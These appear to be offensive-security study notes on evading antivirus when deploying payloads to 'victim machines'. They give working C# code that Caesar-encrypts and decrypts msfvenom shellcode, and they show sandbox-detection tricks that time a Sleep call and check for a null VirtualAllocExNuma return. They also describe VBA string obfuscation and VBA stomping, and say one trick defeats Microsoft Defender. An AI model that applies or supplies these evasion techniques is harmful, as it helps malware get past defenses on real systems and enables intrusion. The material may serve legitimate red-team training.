## Antivirus Evasion

### Caeser Cipher Encrypted Payloads

When creating DLLs to deploy our exploits on victim machines we have been making heavy use of `msfvenom` payloads. Flexible, super convenient, and the resulting shells are blissfully stable and usable... but there is a problem. Antivirus vendors are well aware of this tool, and have written good signature detections to pick up its usage.

One way around this is to bundle our `msfvenom` payloads encoded or encrypted. This is functionality that is built into the tool and has been for some time. However, this creates a new problem. As a defence evasion strategy this is a well established one, and the signature based AV vendors now flag on the encoder/encrypter that makes our shellcode available again at runtime!

A surprisingly effective strategy at this point is to massively go back to basics, and write our own encryptor/decryptor. Since this is just an obfuscation strategy an arbitrarily simple cipher will do, in fact the simpler the better. Modern cipher schemes pursue a property called non-malleability, which means it should not be possible to make alterations to the plaintext that result in predictable changes in the ciphertext. This means that schemes like AES will push plaintexts through multiple rounds of encryption, mixing chunks as it goes. The end result is a ciphertext that is noisy, incoherent, and has very high entropy. This actually potentially makes it more suspicious to an AV, since a high entropy chunk of text is a dead giveaway of an encrypted payload and may well be flagged.

Instead we can leverage the oldest primitive in the book, the Caeser Cipher. By adding a constant value to each byte in our payload we achieve a low entropy custom encrypted payload. The payload contents giveaway signatures will be destroyed, and our decryptor will be too inoccuous to flag, simply subtracting a constant integer from each byte in our byte array.

Custom C\# encrypter (k=5) to print our encrypted shellcode bytes to STDOUT:
```csharp
namespace Encrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] { 0xfc,0x48,0x83,0xe4,0xf0... }
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 5) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("The payload is:\n" + hex.ToString());
        }
    }
}
```

Alteration to our existing C\# exploits needed to cope with our now encrypted shellcode:
```csharp
...
byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2... }
for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
}
...
```

### Emulator Detection using Sleep

To perform heuristic analysis of a binary many AV vendors will partially execute it in a sandboxed way, emulating the behaviour of the Win32 API methods the program reaches out to. This is potentially extremely time consuming, so optimisations have been found. A notable one is to seek out usage of the Sleep Win32 API call and fast-forward it. Any AV that does this gives us an easy means of sandbox detections.

Short chunk of C\# to insert at the top of our payloads to avoid any heuristic AV making use of Sleep fast-forwarding:
```csharp
namespace Payload
{
    class Program
    {
        ...

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            // If the interval here is <2 seconds we know the Sleep command was fast-forwarded.
            // Exit immediately, concealing heuristic behaviour from an AV.
            if(t2 < 1.5) return;
            // Otherwise proceed as normal
            ...
        }
    }
}
```

This does not work against most AVs, however each technique we employ only needs to defeat one or two, and the combination of every technique we leverage will hopefully leave us with something that defeats everything on the target machine. This technique notably defeats Microsoft Defender.


### Emulator Detection using obscure Win32 APIs

An alternative strategy is to exploit the fact that these API calls are being emulated, and the real thing isn't actually running. If a Win32 API call is particularly obscure there are good odds that it has not been emulated, and an invocation will just return null. Checking for a null return on an obscure Win32 API call that should not return null is therefore another viable emulator detction strategy.

```csharp
namespace Payload
{
    class Program
    {
        ...
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // Under real execution conditions this will return a valid address having allocated some memory
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            // If the program is running in an emulator that has not implemented this function it will
            // not return a valid address, so we can exit early concealing the payload behaviour.
            if(mem == null) return;
            ...
        }
    }
}
```

### Emulator Detection using filename (VBA)

It's common for an emulator environment to rename a file for analysis. Another simple strategy for emulator detection is to check the name of the file is what it was at the time it was authored in the VBA.

### Evasion in VBA

While trying to execute Powershell from VBA we will set off a good few AVs. Fairly trivial techniques can be used to defeat these since most are signature based. Namely, reversing the strings that comprise the shellcode, converting them to decimal and caeser cipher encrypting them.

### VBA Stomping

To optimise opening times for OLE files Microsoft implemented something called the `PerformanceCache`. This comes bundled in the OLE file itself. It contains so-called `p-code`, which is VBA code that has been compiled to target a specific version of Office. Before executing the code in a VBA macro Office will look at this cache first. The cache will contain flags to indicate the version of Office the `p-code` targets, if the version of Office in the cache matches the version of Office used to open the file then the VBA code will be skipped entirely. As a result, if we just make sure to appropriately pre-fill the cache, we can remove the code component of our VBA macro entirely. This is excellent since this is what most AVs are looking at.

